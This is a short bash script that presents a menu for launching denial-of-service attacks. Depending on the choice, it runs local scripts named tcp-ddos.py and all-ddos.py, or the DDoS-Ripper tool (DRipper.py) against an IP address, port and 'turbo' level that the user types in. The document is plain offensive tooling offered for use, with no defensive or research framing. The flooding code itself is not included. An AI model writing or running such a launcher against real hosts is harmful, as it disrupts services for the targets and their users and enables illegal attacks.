#!/bin/bash
cd /home/desktop/ddos_files
echo "TCP-1"
echo "ALL-2"
echo "RIPPER-3"
read -p "Choose:" sc
case $sc in
  1)
     clear
     python3 tcp-ddos.py
     ;;
  2)
     clear
     python3 all-ddos.py
     ;;
  3)
     cd DDoS-Ripper
     clear
     read -p "IP:" ip
     read -p "PORT:" port
     read -p "TURBO:" trb
     python3 DRipper.py -s $ip -p $port -t $trb
     ;;
esac
